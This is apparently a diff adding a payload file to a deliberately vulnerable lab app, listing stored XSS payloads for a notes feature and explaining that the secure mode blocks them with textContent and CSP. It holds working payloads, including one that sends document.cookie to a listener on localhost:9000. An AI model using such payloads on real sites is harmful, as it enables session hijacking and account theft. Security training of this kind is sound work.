@@ -1,0 +1,16 @@
+Stored XSS payloads (vuln #3). Paste one into a note BODY and save.
+
+VULN mode renders body with innerHTML -> these execute for anyone who views
+the note. SECURE mode renders with textContent AND sends CSP default-src 'self'
+-> the markup is shown as literal text and inline handlers are blocked.
+
+1. Proof of execution:
+   <img src=x onerror="alert('XSS by '+document.domain)">
+
+2. Session cookie theft (works because vuln cookie has no HttpOnly):
+   <img src=x onerror="new Image().src='http://localhost:9000/steal?c='+document.cookie">
+
+   Run a listener first to catch it:
+   python3 -m http.server 9000     # watch the ?c= query in its log
+
+3. Persistence check — reload the page, payload fires again (it's stored in DB).
